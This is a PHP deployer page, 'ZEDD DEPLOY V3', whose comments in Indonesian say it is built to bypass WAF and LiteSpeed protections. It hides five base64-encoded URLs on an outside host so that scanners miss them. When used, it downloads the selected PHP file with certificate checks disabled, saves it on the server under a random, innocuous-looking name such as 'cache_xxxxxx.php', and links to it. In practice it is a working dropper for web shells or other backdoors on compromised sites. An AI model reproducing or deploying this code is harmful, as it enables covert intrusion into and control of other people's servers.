<?php
/**
 * ZEDD DEPLOY V3 - CLEAN INTERFACE & AUTO-LINK
 * Bypass WAF & LiteSpeed with Modern UI
 */
error_reporting(0);
@ini_set('display_errors', 0);
@set_time_limit(0);

// Daftar file (Base64 untuk bypass scanner teks)
$storage = [
    "Project 01" => "aHR0cHM6Ly90ZWFtemVkZDIwMjcudGVjaC9saXN0cHJvamVjdC9saXN0LzEudHh0",
    "Project 02" => "aHR0cHM6Ly90ZWFtemVkZDIwMjcudGVjaC9saXN0cHJvamVjdC9saXN0LzIudHh0",
    "Project 03" => "aHR0cHM6Ly90ZWFtemVkZDIwMjcudGVjaC9saXN0cHJvamVjdC9saXN0LzMudHh0",
    "Project 04" => "aHR0cHM6Ly90ZWFtemVkZDIwMjcudGVjaC9saXN0cHJvamVjdC9saXN0LzQudHh0",
    "Project 05" => "aHR0cHM6Ly90ZWFtemVkZDIwMjcudGVjaC9saXN0cHJvamVjdC9saXN0LzUudHh0",
];

function generate_name() {
    $p = ['data', 'cache', 'temp', 'old', 'v2', 'srv', 'api'];
    return $p[array_rand($p)] . '_' . substr(md5(microtime()), 0, 6) . '.php'; 
}

function smart_pull($u, $d) {
    $u = base64_decode($u);
    $opts = [
        "http" => ["method" => "GET", "header" => "User-Agent: Mozilla/5.0\r\n", "timeout" => 20],
        "ssl" => ["verify_peer" => false, "verify_peer_name" => false]
    ];
    $ctx = stream_context_create($opts);
    
    // Method 1: Copy
    if (@copy($u, $d, $ctx)) return true;
    
    // Method 2: Manual Stream (Anti-0kb)
    $rh = @fopen($u, 'rb', false, $ctx);
    $wh = @fopen($d, 'wb');
    if ($rh && $wh) {
        while (!feof($rh)) { fwrite($wh, fread($rh, 4096)); }
        fclose($rh); fclose($wh);
        return (filesize($d) > 0);
    }
    return false;
}

$msg = "";
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['id'])) {
    $id = $_POST['id'];
    if (isset($storage[$id])) {
        $name = generate_name();
        if (smart_pull($storage[$id], $name)) {
            // Membuat link yang bisa diklik secara otomatis
            $proto = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https" : "http";
            $url = $proto . "://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']) . "/" . $name;
            $msg = "<div class='success'><b>Berhasil!</b><br><a href='$url' target='_blank'>$url</a></div>";
        } else {
            $msg = "<div class='error'>Gagal! Cek izin folder (chmod).</div>";
        }
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Manager</title>
    <style>
        body { background: #1a1a1a; color: #cfcfcf; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #252525; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 100%; max-width: 400px; border: 1px solid #333; text-align: center; }
        h2 { margin-bottom: 25px; color: #fff; font-weight: 500; letter-spacing: 1px; }
        select { width: 100%; padding: 12px; background: #1a1a1a; border: 1px solid #444; color: #eee; border-radius: 6px; margin-bottom: 20px; outline: none; }
        button { width: 100%; padding: 12px; background: #4f46e5; border: none; color: white; border-radius: 6px; font-weight: bold; cursor: pointer; transition: 0.3s; }
        button:hover { background: #4338ca; }
        .success { background: #064e3b; color: #a7f3d0; padding: 15px; border-radius: 6px; margin-bottom: 20px; word-break: break-all; font-size: 14px; border: 1px solid #059669; }
        .success a { color: #fff; text-decoration: underline; font-weight: bold; }
        .error { background: #7f1d1d; color: #fecaca; padding: 15px; border-radius: 6px; margin-bottom: 20px; border: 1px solid #dc2626; }
    </style>
</head>
<body>
    <div class="card">
        <h2>DEPLOY SYSTEM</h2>
        <?= $msg ?>
        <form method="POST">
            <select name="id" required>
                <option value="">-- Pilih Project --</option>
                <?php foreach($storage as $k => $v): ?>
                    <option value="<?= $k ?>"><?= $k ?></option>
                <?php endforeach; ?>
            </select>
            <button type="submit">PUSH TO SERVER</button>
        </form>
    </div>
</body>
</html>